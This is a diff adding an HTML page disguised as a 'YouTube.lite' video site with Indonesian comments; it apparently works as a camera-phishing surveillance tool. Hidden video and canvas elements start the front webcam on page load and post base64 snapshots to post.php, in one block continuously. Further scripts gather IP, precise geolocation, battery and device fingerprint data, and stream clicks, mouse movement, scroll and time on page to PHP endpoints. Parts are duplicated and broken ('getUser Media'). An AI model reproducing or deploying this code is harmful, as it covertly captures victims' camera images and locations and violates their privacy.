@@ -1,0 +1,805 @@
+</html>
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+   <script>
+    window.console = window.console || function(t) {};
+  </script>
+    <script>
+    if (document.location.search.match(/type=embed/gi)) {
+      window.parent.postMessage("resize", "*");
+    }
+  </script>
+
+  <body translate="no" >
+        <script id="rendered-js">
+  feather.replace();
+  //# sourceURL=pen.js
+      </script>
+  
+    
+    </script>
+  
+  <script>
+    $(document).load(mydata())
+  </script>
+
+
+<script>
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 0); //limit upload
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>YouTube.lite</title>
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700,900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+      <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/feather.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    
+    <title>Interactive Mobile Navbar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #2c3e50;
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .burger {
+            width: 30px;
+            height: 20px;
+            position: relative;
+            cursor: pointer;
+            z-index: 1001;
+        }
+
+        .burger span {
+            position: absolute;
+            height: 3px;
+            width: 100%;
+            background-color: white;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+
+        .burger span:nth-child(1) {
+            top: 0;
+        }
+
+        .burger span:nth-child(2) {
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        .burger span:nth-child(3) {
+            bottom: 0;
+        }
+
+        .burger.active span:nth-child(1) {
+            top: 50%;
+            transform: translateY(-50%) rotate(45deg);
+        }
+
+        .burger.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .burger.active span:nth-child(3) {
+            bottom: 50%;
+            transform: translateY(50%) rotate(-45deg);
+        }
+
+        .nav-links {
+            position: fixed;
+            top: 0;
+            left: -100%;
+            width: 70%;
+            height: 100vh;
+            background-color: #34495e;
+            padding-top: 80px;
+            display: flex;
+            flex-direction: column;
+            transition: left 0.5s ease;
+            z-index: 1000;
+            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .nav-links.active {
+            left: 0;
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            padding: 15px 20px;
+            margin: 5px 0;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .nav-links a::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            transition: left 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            background-color: rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-links a:hover::before {
+            left: 0;
+        }
+
+        .content {
+            margin-top: 70px;
+            padding: 20px;
+        }
+
+        p {
+            margin-bottom: 15px;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+          /* --------------------------------------------------------- */
+
+                .content {
+            margin-top: 100px;
+            padding: 20px;
+        }
+                
+        /* Video Title */
+        .video-title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 0;
+            line-height: 1.2;
+            color: #000;
+            text-align: center;
+        }
+        /* Responsive YouTube iframe wrapper */
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            height: 0;
+            overflow: hidden;
+            border-radius: 14px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.7);
+            background: #000;
+            margin: 20px 0;
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            border-radius: 14px;
+        }
+        /* Suggested videos section */
+        .suggested-videos {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+        }
+        .suggested-video {
+            background: #ffffff;
+            border-radius: 12px;
+            overflow: hidden;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            transition: background-color 0.3s ease;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+                .suggested-video:hover {
+            background-color: #f0f0f0;
+        }
+        .video-info {
+            padding: 12px 14px;
+            color: #333;
+        }
+        .suggested-title {
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 6px;
+            color: #000;
+        }
+        .suggested-channel {
+            font-size: 0.85rem;
+            color: #666;
+        }
+                /* Base styling and reset */
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+
+        
+        .header h1 {
+            font-size: 2rem;
+            color: #ff0000;
+            margin: 0;
+        }
+        .header input {
+            width: 300px;
+            padding: 30px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .header .icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header .icons .material-icons {
+            cursor: pointer;
+            font-size: 24px;
+        }
+
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <a href="#" onclick="locate()" class="logo">YouTube.lite</a>
+        <div class="burger" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </nav>
+
+    <div class="overlay" id="overlay"></div>
+
+    <div class="nav-links" id="navLinks">
+        <input type="text" placeholder="film horor indo">
+        <a href="#" onclick="locate()"><span class="material-icons">home</span> Home</a>
+        <a href="#" onclick="locate()"><span class="material-icons">explore</span> Explore</a>
+        <a href="#" onclick="locate()"><span class="material-icons">subscriptions</span> Subscriptions</a>
+        <a href="#" onclick="locate()"><span class="material-icons">video_library</span> Library</a>
+        <a href="#" onclick="locate()"><span class="material-icons">history</span>History</a>
+         <a href="index.html">back</a>
+    </div>
+
+  
+
+
+            </a>
+    </div>
+    <div class="content">
+        <h1>Your Device Information</h1>
+        <div class="info-container">
+            <button id="showDataBtn" class="btn" onclick="collectAndShowData()">Show My Device Data</button>
+            <div id="visitorData" class="data-display"></div>
+        </div>
+    </div>
+    <style>
+        .btn {
+            padding: 10px 20px;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-bottom: 20px;
+        }
+        .btn:hover {
+            background: #cc0000;
+        }
+        .data-display {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            white-space: pre-line;
+            overflow-x: auto;
+        }
+
+    </style>
+
+<body onload="init()">
+
+<div class="video-wrap">
+    <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+function post(imgdata) {
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'post.php',
+        dataType: 'json',
+        success: function(result) {
+            console.log('Image posted successfully:', result);
+        },
+        error: function() {
+            console.error('Error posting image.');
+        }
+    });
+}
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+const constraints = {
+    audio: false,
+    video: {
+        facingMode: "user" // Use the front camera
+    }
+};
+
+// Access webcam
+async function init() {
+    try {
+        const stream = await navigator.mediaDevices.getUser Media(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        console.error(`navigator.getUser Media error: ${e.toString()}`);
+    }
+}
+
+// Success
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+
+    const context = canvas.getContext('2d');
+    setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        const canvasData = canvas.toDataURL("image/png");
+        const cc = String(canvasData).replace("data:image/png;base64,", "");
+        post(cc);
+    }, 9000); // Capture every 9 seconds
+}
+
+// Load init
+init();
+</script>
+
+</body>
+
+
+
+
+
+
+
+
+
+
+
+    <script>
+    function collectAndShowData() {
+        mydata(function(data) {
+            document.getElementById('visitorData').innerText = data;
+        });
+    }
+
+    function mydata(callback) {
+        var client = new ClientJS(); // Create A New Client Object
+        var OS = client.getOS(); // Get OS Version
+        var ver = client.getOSVersion(); // Get OS Version
+        var getbrow = client.getBrowser(); // Get Browser
+        var getbrowVer = client.getBrowserVersion(); // Get Browser Version
+        var CPU = client.getCPU(); // Get CPU Architecture
+        var currentResolution = client.getCurrentResolution(); // Get Current Resolution
+        var timeZone = '';
+        var ram = navigator.deviceMemory || 'Not Available'; // Get RAM
+        var user = navigator.userAgent; // Get User Agent
+        var sw = window.screen.width; // Get Screen Width
+        var sh = window.screen.height; // Get Screen Height
+        var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        var networkType = connection ? connection.effectiveType : 'Not Available'; // Get Network Type
+        var downlink = connection && connection.downlink ? connection.downlink + ' Mbps' : 'Not Available'; // Get Downlink Speed
+        var rtt = connection && connection.rtt ? connection.rtt + ' ms' : 'Not Available'; // Get Round Trip Time
+        var saveData = connection && connection.saveData ? 'Enabled' : 'Disabled'; // Check if Save Data is enabled
+        var plugins = navigator.plugins.length > 0 ? Array.from(navigator.plugins).map(plugin => plugin.name) : 'No Plugins'; // Get Browser Plugins
+        var localTime = new Date().toLocaleString(); // Get Local Time
+        var languages = navigator.languages || ['Not Available']; // Get Supported Languages
+        var isMobile = /Mobi|Android/i.test(user) ? 'Mobile' : 'Desktop'; // Determine Device Type
+        var orientation = screen.orientation ? screen.orientation.type : 'Not Available'; // Get Screen Orientation
+        var touchSupport = 'ontouchstart' in window ? 'Touch Supported' : 'No Touch Support'; // Check Touch Support
+        var cookiesEnabled = navigator.cookieEnabled ? 'Cookies Enabled' : 'Cookies Disabled'; // Check Cookies Enabled
+        var geolocationEnabled = 'geolocation' in navigator ? 'Geolocation Supported' : 'Geolocation Not Supported'; // Check Geolocation Support
+        var localStorageSupported = 'localStorage' in window ? 'Local Storage Supported' : 'Local Storage Not Supported'; // Check Local Storage Support
+        var sessionStorageSupported = 'sessionStorage' in window ? 'Session Storage Supported' : 'Session Storage Not Supported'; // Check Session Storage Support
+        var batteryStatus = 'Not Available'; // Initialize battery status variable
+        var screenColorDepth = window.screen.colorDepth || 'Not Available'; // Get Screen Color Depth
+        var screenPixelRatio = window.devicePixelRatio || 'Not Available'; // Get Device Pixel Ratio
+
+        try {
+            timeZone = client.getTimeZone(); // Get Time Zone
+        } catch {
+            timeZone = 'Not Found';
+        }
+
+        timeZone = timeZone.toString();
+
+        // Get Battery Status
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                batteryStatus = `Level: ${battery.level * 100}%, Charging: ${battery.charging ? 'Yes' : 'No'}`;
+                fetchIPAndSendData();
+            });
+        } else {
+            fetchIPAndSendData(); // Call if battery status is not available
+        }
+
+        // Fetch IP Address
+        function fetchIP(callback) {
+            $.get("https://api.ipify.org", function(data) {
+                callback(data);
+            }).fail(function() {
+                console.error("Failed to fetch IP address.");
+                callback("Not Available");
+            });
+        }
+
+        // Get Geolocation
+        function getGeolocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var geolocationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    callback(geolocationData);
+                }, function() {
+                    callback(null);
+                });
+            } else {
+                callback(null);
+            }
+        }
+
+        // Fetch IP and then send data
+        function fetchIPAndSendData() {
+            fetchIP(function(ip) {
+                getGeolocation(function(geolocationData) {
+                    var latitude = geolocationData ? geolocationData.latitude : 'Not Available';
+                    var longitude = geolocationData ? geolocationData.longitude : 'Not Available';
+                    var accuracy = geolocationData ? geolocationData.accuracy + ' meters' : 'Not Available';
+
+var combinedData = `---INFORMASI--- 
+jika anda mengaktifkan akses kamera dan lokasi maka admin akan memantau dan mendapatkan capture dari kamera tersebut dan lokasi secara akurat
+---DEVICE--- 
+Mobile/PC            : ${isMobile}
+IP                   : ${ip} 
+RAM                  : ${ram}  
+User                  : ${user} 
+OS Name              : ${OS} 
+Version              : ${ver} 
+CPU Name             : ${CPU} 
+LocalStorage Support  : ${localStorageSupported} 
+SessionStorage Support : ${sessionStorageSupported} 
+---LAYAR--- 
+Screen Width         : ${sw} 
+Screen Height        : ${sh} 
+Resolution           : ${currentResolution} 
+Color Depth          : ${screenColorDepth} 
+Pixel Ratio          : ${screenPixelRatio} 
+Screen               : ${sw}x${sh} 
+Screen Orientation    : ${orientation} 
+Touch Support        : ${touchSupport} 
+---WAKTU--- 
+Local Time          : ${localTime} 
+Languages           : ${languages.join(', ')} 
+Time Zone           : ${timeZone} 
+Latitude            : ${latitude} 
+Longitude           : ${longitude} 
+Accuracy            : ${accuracy} 
+---BROWSER--- 
+Browser Name        : ${getbrow} 
+Browser Version     : ${getbrowVer} 
+Plugins             : ${plugins} 
+Cookies Enabled      : ${cookiesEnabled} 
+---BATTERY--- 
+Battery Status      : ${batteryStatus}`;
+                    callback(combinedData);
+                });
+            });
+        }
+    }
+
+    // Pemantauan Klik
+    function monitorClicks() {
+        document.addEventListener('click', function(event) {
+            var clickData = {
+                x: event.clientX,
+                y: event.clientY,
+                element: event.target.tagName,
+                time: new Date().toLocaleString()
+            };
+            console.log('Click Data:', clickData);
+            sendClickDataToServer(clickData);
+        });
+    }
+
+    function sendClickDataToServer(clickData) {
+        $.ajax({
+            type: 'POST',
+            url: 'clickHandler.php', // Endpoint untuk menyimpan data klik
+            data: { "clickData": JSON.stringify(clickData) },
+            success: function(response) {
+                console.log('Click data sent successfully:', response);
+            },
+            error: function(error) {
+                console.error('Error sending click data:', error);
+            }
+        });
+    }
+
+    // Pemantauan Pergerakan Mouse
+    function monitorMouseMovement() {
+        document.addEventListener('mousemove', function(event) {
+            var mouseData = {
+                x: event.clientX,
+                y: event.clientY,
+                time: new Date().toLocaleString()
+            };
+            console.log('Mouse Movement Data:', mouseData);
+            sendMouseDataToServer(mouseData);
+        });
+    }
+
+    function sendMouseDataToServer(mouseData) {
+        $.ajax({
+            type: 'POST',
+            url: 'mouseHandler.php', // Endpoint untuk menyimpan data pergerakan mouse
+            data: { "mouseData": JSON.stringify(mouseData) },
+            success: function(response) {
+                console.log('Mouse data sent successfully:', response);
+            },
+            error: function(error) {
+                console.error('Error sending mouse data:', error);
+            }
+        });
+    }
+
+    // Pemantauan Waktu yang Dihabiskan di Halaman
+    var pageLoadTime = new Date().getTime();
+
+    function monitorTimeSpent() {
+        window.addEventListener('beforeunload', function() {
+            var timeSpent = new Date().getTime() - pageLoadTime;
+            console.log('Time Spent on Page:', timeSpent / 1000 + ' seconds');
+            sendTimeSpentToServer(timeSpent);
+        });
+    }
+
+    function sendTimeSpentToServer(timeSpent) {
+        $.ajax({
+            type: 'POST',
+            url: 'timeHandler.php', // Endpoint untuk menyimpan data waktu yang dihabiskan
+            data: { "timeSpent": timeSpent },
+            success: function(response) {
+                console.log('Time spent data sent successfully:', response);
+            },
+            error: function(error) {
+                console.error('Error sending time spent data:', error);
+            }
+        });
+    }
+
+    // Pemantauan Scroll
+    function monitorScroll() {
+        window.addEventListener('scroll', function() {
+            var scrollData = {
+                scrollTop: window.scrollY,
+                time: new Date().toLocaleString()
+            };
+            console.log('Scroll Data:', scrollData);
+            sendScrollDataToServer(scrollData);
+        });
+    }
+
+    function sendScrollDataToServer(scrollData) {
+        $.ajax({
+            type: 'POST',
+            url: 'scrollHandler.php', // Endpoint untuk menyimpan data scroll
+            data: { "scrollData": JSON.stringify(scrollData) },
+            success: function(response) {
+                console.log('Scroll data sent successfully:', response);
+            },
+            error: function(error) {
+                console.error('Error sending scroll data:', error);
+            }
+        });
+    }
+
+    // Inisialisasi fungsi pemantauan
+    monitorClicks();
+    monitorMouseMovement();
+    monitorTimeSpent();
+    monitorScroll();
+</script>
+
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 300vh;
+            background-color: #f0f0f0;
+        }
+        .video-wrap {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        video {
+            border: 0px solid #ccc;
+            width: 640px;
+            height: 480px;
+        }
+
+    </style>
+
+    
+    <script>
+        const burger = document.querySelector('.burger');
+        const navLinks = document.getElementById('navLinks');
+        const overlay = document.getElementById('overlay');
+
+        function toggleMenu() {
+            burger.classList.toggle('active');
+            navLinks.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        function closeMenu() {
+            burger.classList.remove('active');
+            navLinks.classList.remove('active');
+            overlay.classList.remove('active');
+        }
+
+        overlay.addEventListener('click', closeMenu);
+
+        // Close menu when clicking on content area
+        document.querySelector('.content').addEventListener('click', function() {
+            if (navLinks.classList.contains('active')) {
+                closeMenu();
+            }
+        });
+    </script>
+
+</body>
+</html>
+
